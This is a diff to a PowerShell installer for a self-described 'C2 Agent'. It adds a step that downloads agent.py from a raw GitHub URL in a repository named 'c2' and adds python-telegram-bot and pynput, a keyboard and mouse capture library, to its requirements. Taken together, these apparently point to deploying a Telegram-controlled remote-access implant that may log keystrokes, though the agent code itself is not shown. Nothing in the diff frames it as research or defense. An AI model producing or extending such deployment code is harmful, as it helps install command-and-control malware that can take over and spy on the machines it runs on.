@@ -154,19 +154,22 @@ if (-not (Test-Path $InstallPath)) {
 $agentPyPath = Join-Path $InstallPath "agent.py"
 
 if (-not (Test-Path $agentPyPath)) {
-    Write-Warn "agent.py not found in $InstallPath"
-    Write-Host "Please copy agent.py to $InstallPath and run this installer again." -ForegroundColor Yellow
-    Write-Host "Or download it from your repository." -ForegroundColor Yellow
+    Write-Host "Downloading agent.py from repository..." -ForegroundColor Yellow
     
-    # Create a placeholder
-    @"
+    try {
+        $downloadUrl = "https://raw.githubusercontent.com/adnansamirswe/c2/main/node/agent.py"
+        Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
+        Write-Success "Downloaded agent.py"
+    } catch {
+        Write-Err "Failed to download agent.py. Please copy it manually."
+        # Create a placeholder only if download fails
+        @"
 # C2 Agent - Placeholder
 # Please replace this with the actual agent.py from your repository
-print("Please configure agent.py with your actual agent code.")
+print("Error: agent.py failed to download. Please replace this file.")
 input("Press Enter to exit...")
 "@ | Set-Content -Path $agentPyPath -Encoding UTF8
-    
-    Write-Success "Created placeholder agent.py - please replace with actual code"
+    }
 }
 
 # =============================================================================
@@ -202,11 +205,16 @@ Write-Step "Creating requirements.txt..."
 
 $requirementsPath = Join-Path $InstallPath "requirements.txt"
 
-@"
+if (-not (Test-Path $requirementsPath)) {
+    @"
+python-telegram-bot>=21.0
 httpx>=0.27.0
+pynput>=1.7.0
 "@ | Set-Content -Path $requirementsPath -Encoding UTF8
-
-Write-Success "Created requirements.txt"
+    Write-Success "Created requirements.txt"
+} else {
+    Write-Success "requirements.txt already exists, skipping creation"
+}
 
 # =============================================================================
 # STEP 6: Install Dependencies
